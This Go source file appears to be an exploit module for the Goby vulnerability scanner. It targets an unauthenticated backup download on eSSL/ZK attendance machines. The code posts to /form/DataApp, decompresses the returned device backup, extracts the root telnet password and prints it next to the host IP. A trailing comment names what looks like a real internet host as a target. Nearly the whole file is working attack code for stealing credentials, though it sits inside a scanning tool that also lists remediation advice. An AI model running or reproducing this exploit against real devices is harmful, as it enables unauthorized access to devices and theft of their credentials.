package exploits

import (
	"bytes"
	"compress/gzip"
	"encoding/hex"
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"io"
	"io/ioutil"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "eSSL DataApp unauth database download",
    "Description": "The ESSL attendance machine is not authorized to download backup files, which can be used by attackers to further attack the system, such as telnet password",
    "Product": "eSSL-attendance",
    "Homepage": "http://esslsecurity.com/",
    "DisclosureDate": "2021-06-02",
    "Author": "sharecast.net@gmail.com",
    "GobyQuery": "header=\"ZK Web Server\"",
    "Level": "2",
    "Impact": "<p>The code implements the file download to the client, but if the incoming parameters are not filtered, it can download any file of the service, resulting in any file download vulnerability. For example, downloading database configuration files can lead hackers to successfully enter the database or sensitive information of the system. Cause the website or server to fall.</p>",
    "Recommendation": "<p>1. Before downloading, you can filter the incoming parameters and directly replace... With null, which can simply achieve the purpose of prevention.</p><p>2. Check the download file type to determine whether the download type is allowed.</p><p>3. Upgrade to the latest version</p>",
    "References": [
        "https://nosec.org/home/detail/3032.html"
    ],
    "HasExp": true,
    "ExpParams": null,
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": null,
    "ExploitSteps": null,
    "Tags": [
        "download"
    ],
    "CVEIDs": null,
    "CVSSScore": "0.0",
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10216"
}`

	hexEncode := func(rawbody string) []byte {
		src := []byte(rawbody)
		dst := make([]byte, hex.EncodedLen(len(src)))
		hex.Encode(dst, src)
		return dst
	}

	hexDecode := func(rawbody string) []byte {
		decodedStr, _ := hex.DecodeString(rawbody)
		return decodedStr
	}
	ungzip := func(w io.Writer, data []byte) {
		gr, _ := gzip.NewReader(bytes.NewBuffer(data))
		defer gr.Close()
		data, _ = ioutil.ReadAll(gr)
		w.Write(data)
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			uri := "/form/DataApp"
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfg.VerifyTls = false
			cfg.FollowRedirect = true
			cfg.Data = "style=1"
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				return resp.StatusCode == 200 && strings.Contains(resp.Header.Get("Content-Disposition"), "filename=device")
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			uri := "/form/DataApp"
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfg.VerifyTls = false
			cfg.FollowRedirect = true
			cfg.Data = "style=1"

			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				if resp.StatusCode == 200 && strings.Contains(resp.Header.Get("Content-Disposition"), "filename=device") && strings.Contains(resp.RawBody, "ZK format") {
					var buf bytes.Buffer
					encBody := hexEncode(resp.RawBody)
					strBody := fmt.Sprintf("%s\n", encBody)
					gzipBody := fmt.Sprintf("1f8b0800%s", strings.Split(strBody, "1f8b0800")[1])
					gzipByte := hexDecode(gzipBody)
					ungzip(&buf, gzipByte)
					conf := fmt.Sprintf("\n%s\n", buf.String())
					if strings.Contains(conf, "$Telnet=") {
						telnetpwd := regexp.MustCompile(`\$Telnet=(.*?)\r?\n`).FindStringSubmatch(conf)[1]
						telpass := fmt.Sprintf("Try to telnet ip: %s, user: root, password: %s", expResult.HostInfo.IP, telnetpwd)
						expResult.Success = true
						expResult.Output = telpass
					} else {
						expResult.Success = true
						expResult.Output = conf
					}

				}

			}
			return expResult
		},
	))
}

//http://218.255.176.210:5084/
